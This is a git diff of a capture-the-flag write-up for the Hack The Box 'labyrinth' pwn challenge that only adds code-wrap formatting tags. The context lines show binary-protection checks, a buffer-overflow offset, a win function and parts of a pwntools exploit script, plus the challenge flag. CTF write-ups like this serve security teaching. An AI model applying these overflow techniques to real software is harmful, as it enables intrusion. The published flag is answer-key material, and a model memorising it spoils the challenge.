@@ -26,11 +26,14 @@ layout:
 
 Check file info and binary protections.
 
+{% code overflow="wrap" %}
 ```bash
 file labyrinth
 labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, for GNU/Linux 3.2.0, not stripped
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```bash
 checksec --file labyrinth
 [*] '/home/crystal/Desktop/htb/challenge/labyrinth'
@@ -41,11 +44,13 @@ checksec --file labyrinth
     PIE:      No PIE (0x400000)
     RUNPATH:  b'./glibc/'
 ```
+{% endcode %}
 
 Decompile in ghidra and find we must select door `69` followed by door `069`. However, providing `069` is enough to satisfy both conditions.
 
 In ghidra, we can find our offset of `64` and a "win" function called `escape_plan` which prints the flag.
 
+{% code overflow="wrap" %}
 ```python
 from pwn import *
 
@@ -103,5 +108,6 @@ io.sendlineafter(b'>', payload)
 io.recvuntil(b'journey:')
 warn(io.recvlines(2)[1].decode())
 ```
+{% endcode %}
 
 Flag: `HTB{3sc4p3_fr0m_4b0v3}`
